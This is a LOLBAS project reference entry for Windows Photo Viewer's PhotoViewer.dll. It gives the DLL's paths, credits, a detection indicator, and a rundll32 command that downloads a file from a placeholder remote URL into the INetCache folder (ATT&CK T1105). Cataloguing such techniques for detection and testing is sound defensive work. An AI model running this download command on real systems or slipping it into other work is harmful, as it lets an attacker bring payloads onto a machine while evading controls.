---
title: "PhotoViewer.dll"
source: lolbas-project.github.io
source_url: https://lolbas-project.github.io/lolbas/Libraries/PhotoViewer/
fetched_at: 2026-09-20T17:16:17Z
license: unspecified
category: windows
---

Windows Photo Viewer

## Paths
- C:\Program Files\Windows Photo Viewer\PhotoViewer.dll
- C:\Program Files (x86)\Windows Photo Viewer\PhotoViewer.dll

## Acknowledgements
- Avihay Eldad ([@avihayeldad](https://twitter.com/@avihayeldad))
- Tommy Warren

## Detections
- IOC: Execution of rundll32.exe with 'ImageView_Fullscreen' and a remote URL (containing '://') as an argument

## Download

1. Once executed, rundll32.exe will download the file at the specified URL to the user’s INetCache folder using the Windows Photo Viewer DLL.

```
rundll32.exe "C:\Program Files\Windows Photo Viewer\PhotoViewer.dll",ImageView_Fullscreen {REMOTEURL}
```

   - Use case: Download file from remote location.

   - Privileges required: User

   - Operating systems: Windows 10, Windows 11

   - ATT&CK® technique: T1105

   - Tags: Download: INetCache
